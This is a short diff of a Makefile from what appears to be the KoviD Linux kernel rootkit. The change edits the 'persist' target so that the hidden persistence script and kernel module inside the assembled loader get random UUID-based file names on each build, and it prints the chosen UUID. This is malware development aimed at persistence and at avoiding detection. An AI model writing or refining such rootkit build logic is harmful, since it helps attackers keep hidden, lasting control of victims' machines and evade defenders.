@@ -114,11 +114,12 @@ install-ebpf: build-ebpf
 	@echo "eBPF ebpf_kovid.json will be in /tmp/$(EBPFHIDEKEY)"
 
 persist:
-	sed -i "s|.lm.sh|${UUIDGEN}.sh|g" $(persist).S
-	sed -i "s|.kv.ko|${UUIDGEN}.ko|g" $(persist).S
+	sed -i "s|\\.[a-zA-Z0-9_-]*\.sh|.${UUIDGEN}.sh|g" $(persist).S
+	sed -i "s|\\.[a-zA-Z0-9_-]*\.ko|.${UUIDGEN}.ko|g" $(persist).S
 	$(AS) --64 $(persist).S -statistics -fatal-warnings \
 		-size-check=error -o $(persist).o
 	$(LD) -Ttext 200000 --oformat binary -o $(persist) $(persist).o
+	@echo "UUIDGEN=${UUIDGEN}"
 
 lgtm: persist
 	make  -C  /lib/modules/$(shell dpkg --status linux-headers-generic |grep ^Depends| \
